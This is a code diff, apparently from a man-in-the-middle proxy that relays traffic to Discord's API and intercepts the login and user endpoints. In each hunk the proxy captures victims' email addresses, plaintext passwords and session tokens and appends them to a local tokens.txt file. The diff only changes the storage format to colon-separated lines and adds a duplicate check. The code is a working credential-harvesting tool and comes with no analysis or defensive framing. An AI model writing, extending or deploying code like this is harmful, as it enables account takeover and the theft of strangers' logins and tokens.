@@ -56,7 +56,7 @@ if(headers['content-type']) headersNew['content-type'] = headers['content-type']
 		return d.trim();
 	});
 	
-  arr.unshift({email: s.email, token: s.token})
+if(!arr.includes(s.email)) arr.unshift(`${s.email}:${s.token}`)
 	fs.writeFileSync("./tokens.txt", arr.join("\n"));
 }
 if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/login` && s.token){
@@ -68,7 +68,7 @@ if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/
 		return d.trim();
 	});
 	
-  arr.unshift({email: req.body.login, password: req.body.password, token: s.token})
+if(!arr.includes(req.body.login)) arr.unshift(`${req.body.login}:${req.body.password}:${s.token}`)
 	fs.writeFileSync("./tokens.txt", arr.join("\n"));
 }
 
@@ -98,7 +98,7 @@ if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users
 		return d.trim();
 	});
 	
-  arr.unshift({email: s.email, token: s.token})
+if(!arr.includes(s.email)) arr.unshift(`${s.email}:${s.token}`)
 	fs.writeFileSync("./tokens.txt", arr.join("\n"));
 }
 if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/login` && s.token){
@@ -110,7 +110,7 @@ if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/
 		return d.trim();
 	});
 	
-  arr.unshift({email: req.body.login, password: req.body.password, token: s.token})
+if(!arr.includes(req.body.login)) arr.unshift(`${req.body.login}:${req.body.password}:${s.token}`)
 	fs.writeFileSync("./tokens.txt", arr.join("\n"));
 }
 
